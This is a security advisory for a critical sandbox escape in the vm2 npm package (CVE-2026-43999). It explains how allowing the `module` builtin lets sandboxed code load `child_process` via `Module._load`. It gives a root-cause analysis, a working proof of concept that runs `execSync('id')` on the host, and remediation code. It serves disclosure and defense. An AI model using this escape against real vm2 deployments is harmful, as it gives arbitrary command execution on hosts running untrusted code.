# [C] vm2 has a NodeVM builtin allowlist bypass via `module` builtin's `Module._load` that allows sandbox escape

## Summary
Severity: Critical
Advisory: GHSA-947f-4v7f-x2v8
CVE: CVE-2026-43999
CWE: CWE-863
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-947f-4v7f-x2v8
Type: github-advisory

## Affected
- npm: `vm2` — affected >=3.10.5 <3.11.0

## Details
## Summary
NodeVM's `builtin` allowlist can be bypassed when the `module` builtin is allowed (including via the `'*'` wildcard). The `module` builtin exposes Node's `Module._load()`, which loads any module by name directly in the host context, completely bypassing vm2's builtin restriction. This allows sandboxed code to load excluded builtins like `child_process` and achieve remote code execution.

## Severity
**Critical** (CVSS 3.1: 9.9)

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`

- **Attack Vector:** Network — sandboxed code is typically received from external sources (user-submitted scripts, plugin code)
- **Attack Complexity:** Low — no special conditions required; `['*', '-child_process']` is a common, documented pattern
- **Privileges Required:** Low — attacker needs only the ability to submit code to the sandbox, which is the intended use case
- **User Interaction:** None
- **Scope:** Changed — escape from sandbox boundary to host system
- **Confidentiality Impact:** High — arbitrary command execution on the host
- **Integrity Impact:** High — arbitrary command execution on the host
- **Availability Impact:** High — arbitrary command execution on the host

## Affected Component
- `lib/builtin.js` — `makeBuiltinsFromLegacyOptions()` (lines 109-117) — includes `module` in `'*'` expansion
- `lib/builtin.js` — `addDefaultBuiltin()` (lines 86-90) — loads `module` with generic readonly wrapper
- `lib/builtin.js` — `SPECIAL_MODULES` (line 61) — does NOT include `module`

## CWE
- **CWE-863**: Incorrect Authorization

## Description

### Root Cause: The `module` builtin provides unrestricted host module loading

When `builtin: ['*', '-child_process']` is configured, `makeBuiltinsFromLegacyOptions` iterates over `BUILTIN_MODULES` and adds all modules not explicitly excluded:

```js
// lib/builtin.js:40
const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
    .filter(s=>!s.startsWith('internal/'));

// lib/builtin.js:109-117
if (Array.isArray(builtins)) {
    const def = builtins.indexOf('*') >= 0;
    if (def) {
        for (let i = 0; i < BUILTIN_MODULES.length; i++) {
            const name = BUILTIN_MODULES[i];
            if (builtins.indexOf(`-${name}`) === -1) {
                addDefaultBuiltin(res, name, hostRequire);
            }
        }
    }
```

Node's `builtinModules` includes `'module'` (verified: `require('module').builtinModules.includes('module')` → `true`). Since only `'-child_process'` is excluded, `'module'` passes the filter and gets added.

The `module` builtin is NOT in `SPECIAL_MODULES` (which only covers `events`, `buffer`, `util`), so it gets the generic loader:

```js
// lib/builtin.js:86-90
function addDefaultBuiltin(builtins, key, hostRequire) {
    if (builtins.has(key)) return;
    const special = SPECIAL_MODULES[key];
    builtins.set(key, special ? special : vm => vm.readonly(hostRequire(key)));
}
```

This wraps Node's `Module` class in a readonly proxy and hands it to the sandbox.

### The readonly proxy does not prevent method calls

`ReadOnlyHandler` (bridge.js:940-983) only overrides mutation traps: `set`, `setPrototypeOf`, `defineProperty`, `deleteProperty`, `isExtensible`, `preventExtensions`. It does NOT override `get` or `apply`, which are inherited from `BaseHandler`.

`BaseHandler.apply()` (bridge.js:665-677) forwards function calls directly to the host context:

```js
apply(target, context, args) {
    const object = getHandlerObject(this);
    let ret;
    try {
        context = otherFromThis(context);
        args = otherFromThisArguments(args);
        ret = otherReflectApply(object, context, args);
    } catch (e) {
        throw thisFromOtherForThrow(e);
    }
    return thisFromOther(ret);
}
```

So `Module._load('child_process')` is forwarded to Node's native `Module._load` in the host context, which loads `child_process` without any vm2 allowlist check.

### Inconsistent defense: some builtins are isolated, `module` is not

The codebase IS aware that certain builtins need special handling:

- `events`: Gets a complete sandbox-native reimplementation via `lib/events.js`
- `buffer`: Custom loader that only exposes the `Buffer` class
- `util`: Custom loader that replaces `inherits` with a sandbox-safe version

But `module` — which provides access to the host's entire module loading infrastructure via `Module._load`, `Module._resolveFilename`, etc. — gets no special treatment at all.

### Full execution chain

1. Host configures `NodeVM` with `builtin: ['*', '-child_process']`
2. `makeBuiltinsFromLegacyOptions` adds `'module'` to allowed builtins (not excluded)
3. Sandbox code calls `require('module')` → resolver finds `'module'` in builtins → `loadBuiltinModule('module')`
4. Loader calls `vm.readonly(hostRequire('module'))` → returns readonly proxy of Node's `Module` class
5. Sandbox reads `Module._load` → `BaseHandler.get()` returns proxied function
6. Sandbox calls `Module._load('child_process')` → `BaseHandler.apply()` forwards to host
7. Host's `Module._load` loads `child_process` natively (no vm2 check involved)
8. `child_process` module proxied back to sandbox
9. Sandbox calls `child_process.execSync('id')` → executes on host → RCE

## Proof of Concept

```js
const { NodeVM } = require('vm2');

// Developer thinks child_process is blocked
const vm = new NodeVM({
  require: {
    builtin: ['*', '-child_process'],
    external: false,
  },
});

const out = vm.run(`
  const Module = require('module');
  // Module._load bypasses vm2's builtin allowlist entirely
  const cp = Module._load('child_process');
  module.exports = cp.execSync('id').toString();
`, 'poc.js');

console.log(out.trim()); // prints host uid/gid — RCE achieved
```

## Impact
- **Complete builtin allowlist bypass**: Any configuration that allows the `module` builtin (including `['*', '-X']` patterns) can load ANY builtin, including explicitly excluded ones.
- **Remote code execution**: Sandboxed code can execute arbitrary commands on the host via `child_process.execSync`.
- **Common configuration affected**: The `['*', '-child_process', '-fs']` pattern is documented and widely used by developers who want "all builtins except dangerous ones."
- **No special conditions**: Unlike environment-dependent attacks, this works on every Node.js version, every OS, and every vm2 deployment that uses the `'*'` wildcard.
- **Additional attack surfaces via `module`**: Beyond `_load`, the `Module` class also exposes `_resolveFilename`, `_cache`, `_pathCache`, and other internals that could be abused.

## Recommended Remediation

### Option 1: Exclude `module` from `BUILTIN_MODULES` entirely (Preferred)

The `module` builtin provides unrestricted host module loading and should never be exposed to the sandbox:

```js
// lib/builtin.js:40
const DANGEROUS_BUILTINS = new Set(['module', 'worker_threads', 'cluster']);

const BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))
    .filter(s => !s.startsWith('internal/') && !DANGEROUS_BUILTINS.has(s));
```

This prevents `module` from being included even with the `'*'` wildcard. Consider also blocking `worker_threads` and `cluster` which can spawn processes.

### Option 2: Add `module` to `SPECIAL_MODULES` with a safe wrapper

If `module` must be accessible, provide a sandbox-safe version that only exposes safe APIs:

```js
// lib/builtin.js
const SPECIAL_MODULES = {
    events: { /* ... existing ... */ },
    buffer: defaultBuiltinLoaderBuffer,
    util: defaultBuiltinLoaderUtil,
    module: function defaultBuiltinLoaderModule(vm) {
        // Only expose safe, read-only metadata — no _load, no _resolveFilename
        return vm.readonly({
            builtinModules: [...nmod.builtinModules],
            // Omit _load, _resolveFilename, _cache, createRequire, etc.
        });
    }
};
```

**Tradeoff**: Breaks sandbox code that legitimately uses `Module` APIs, but those APIs are inherently unsafe in a sandbox context.

## Credit
This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-947f-4v7f-x2v8
- https://nvd.nist.gov/vuln/detail/CVE-2026-43999
- https://github.com/patriksimek/vm2
